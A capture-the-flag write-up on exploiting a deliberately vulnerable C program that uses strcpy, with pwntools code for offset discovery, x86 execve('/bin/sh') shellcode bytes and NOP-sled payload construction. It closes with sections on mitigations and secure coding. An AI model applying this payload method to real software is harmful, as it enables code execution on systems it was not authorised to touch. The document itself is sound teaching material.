# Writeup – Stack Smashing Shellcode Exploitation

This challenge involved implementing a classic **stack smashing attack** to exploit a buffer overflow vulnerability in a simple C program. The goal was to craft a precise payload that overwrites the return address to execute injected shellcode, demonstrating fundamental buffer overflow exploitation techniques.

---

## 🔍 Challenge Overview

The vulnerable program [`vuln.c`](./vuln.c) contains a textbook buffer overflow vulnerability:

```c
void func(char *name)
{
    char buf[256];      // Stack buffer
    strcpy(buf, name);  // Unsafe copy - vulnerability here!
    printf("Hello %s\n", buf);
}

int main(int argc, char *argv[])
{
    func(argv[1]);      // User input passed directly
    return 0;
}
```

### 🎯 Key Vulnerabilities:
- **Unchecked `strcpy()`** allowing buffer overflow
- **Stack-based buffer** adjacent to return address
- **No stack protection** (canaries, ASLR disabled)
- **Executable stack** allowing shellcode execution

---

## 🛠️ My Exploitation Approach

### 1. **Vulnerability Analysis**
- Identified 256-byte buffer that can overflow into return address
- Stack layout: `buf[256]` → saved EBP → **return address**
- Confirmed executable stack permissions for shellcode injection

### 2. **Crash Analysis and Offset Discovery**
Used cyclic patterns to determine exact overflow parameters:
```python
cyclic_seq = cyclic(300)  # Generate de Bruijn sequence
p = process([path_to_vuln_prgm, cyclic_seq])
p.wait_for_close()  # Let it crash

# Extract crash information from kernel logs
crash_info = subprocess.run("dmesg | grep 'vuln' | tail -n 1", stdout=subprocess.PIPE, shell=True).stdout
esp = int(re.search(b'sp\ (.*)\ error', crash_info).group(1), 16)
eip = int(re.search(b'at\ (.*)\ ip', crash_info).group(1), 16)
```

### 3. **Precise Offset Calculation**
Determined exact overflow length using pwntools:
```python
overflow_len = cyclic_find(p32(eip))  # Find EIP offset in cyclic pattern
buffer_address = esp - overflow_len - 8  # Calculate buffer start address
```

### 4. **Payload Architecture Design**
Crafted a sophisticated payload structure:
```python
# Calculate optimal NOP sled size
nop = (overflow_len - 12) // 2  
nop_sled = b'\x90' * nop  

# Fill remaining space with padding
padding = b'A' * (overflow_len - nop - len(shellcode))  

# Jump to middle of NOP sled for reliability
jump = p32(buffer_address + (nop // 2))  

# Final payload construction
payload = nop_sled + shellcode + padding + jump
```

### 5. **Shellcode Selection**
Used classic x86 Linux shellcode for interactive shell:
```python
# Hand-crafted x86 execve("/bin/sh") shellcode
return True, b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
```

---

## 🔬 Technical Exploitation Details

### Memory Layout Analysis
```
Stack (grows down):
├── buf[256]         ← Overflow target (our payload goes here)
├── saved EBP        ← Overwritten during overflow  
└── return address   ← Overwrite with jump to shellcode
```

### Payload Structure
```
[NOP sled] + [Shellcode] + [Padding] + [Return Address]
    ↓            ↓            ↓             ↓
  Reliability  Execution    Alignment   Control Flow
```

### Exploitation Flow
1. **Crash Analysis**: Generate cyclic pattern to crash program
2. **Address Extraction**: Parse kernel logs for ESP/EIP values
3. **Offset Calculation**: Determine exact overflow length
4. **Buffer Positioning**: Calculate shellcode injection point
5. **Payload Construction**: Build NOP sled + shellcode + jump address
6. **Execution**: Overwrite return address to redirect to shellcode

---

## 🧪 Advanced Payload Engineering

### NOP Sled Optimization
```python
# Dynamically sized NOP sled for maximum reliability
nop = (overflow_len - 12) // 2  # Account for shellcode and padding
nop_sled = b'\x90' * nop        # x86 NOP instruction sequence
```

### Jump Address Calculation
```python
# Jump to middle of NOP sled for maximum landing zone
jump = p32(buffer_address + (nop // 2))
```

### Padding Precision
```python
# Exact padding to align return address overwrite
padding = b'A' * (overflow_len - nop - len(shellcode))
```

---

## 🏆 Exploitation Success

The stack smashing attack successfully:
- ✅ **Calculated precise overflow offset** using cyclic patterns
- ✅ **Extracted runtime addresses** from crash analysis
- ✅ **Crafted reliable payload** with optimized NOP sled
- ✅ **Achieved code execution** through shellcode injection
- ✅ **Spawned interactive shell** demonstrating complete control

### 🎯 Result: **Complete System Compromise**

The exploit successfully overwrote the return address and executed shellcode, providing an interactive shell with the same privileges as the vulnerable program.

---

## 🛡️ Defense Mechanisms

### Stack Protection Technologies
1. **Stack Canaries**: Detect buffer overflow before return address corruption
2. **ASLR (Address Space Layout Randomization)**: Randomize memory layout
3. **NX/DEP (Data Execution Prevention)**: Mark stack as non-executable
4. **Control Flow Integrity (CFI)**: Validate return address targets
5. **Stack Clash Protection**: Prevent stack pointer manipulation

### Secure Coding Practices
```c
// Replace unsafe functions
strncpy(buf, name, sizeof(buf) - 1);  // Instead of strcpy()
buf[sizeof(buf) - 1] = '\0';          // Ensure null termination

// Input validation
if (strlen(name) >= sizeof(buf)) {
    fprintf(stderr, "Input too long\n");
    return -1;
}
```

---

## 📚 Key Learnings

1. **Buffer Overflow Fundamentals**: Understanding stack-based memory corruption
2. **Dynamic Analysis**: Using crash dumps for exploitation development
3. **Payload Engineering**: Crafting reliable exploits with NOP sleds
4. **Address Calculation**: Runtime memory layout determination
5. **Shellcode Integration**: Injecting and executing arbitrary code
6. **Defense Awareness**: Modern protection mechanisms and bypasses

---

## 🎯 Historical Significance

This challenge pays homage to **"Aleph One"** (Elias Levy), who published the seminal paper *"Smashing the Stack for Fun and Profit"* in 1996. This foundational work:
- **Introduced stack overflow exploitation** to the security community
- **Established buffer overflow techniques** still used today
- **Influenced modern exploit development** and mitigation strategies
- **Shaped cybersecurity education** and defensive programming practices

The flag **"Aleph One"** represents this historical milestone in computer security research.

---

## 🔬 Educational Value

This challenge demonstrates:
- **Classical exploitation techniques** that remain relevant today
- **Foundation skills** essential for advanced exploit development
- **Defense evolution** from simple vulnerabilities to modern protections
- **Historical context** of vulnerability research and disclosure

---

## 📁 Files Overview

- [`vuln.c`](./vuln.c) - Vulnerable C program with stack buffer overflow
- [`exploit.py`](./exploit.py) - Complete exploitation script with dynamic analysis
- [`shellcode.py`](./shellcode.py) - Shellcode generation and selection utilities
- [`challenge.md`](./challenge.md) - Challenge description and objectives
- [`writeup.md`](./writeup.md) - This technical analysis

This challenge showcased fundamental binary exploitation skills and demonstrated the evolution from basic vulnerabilities to the sophisticated protection mechanisms employed in modern systems.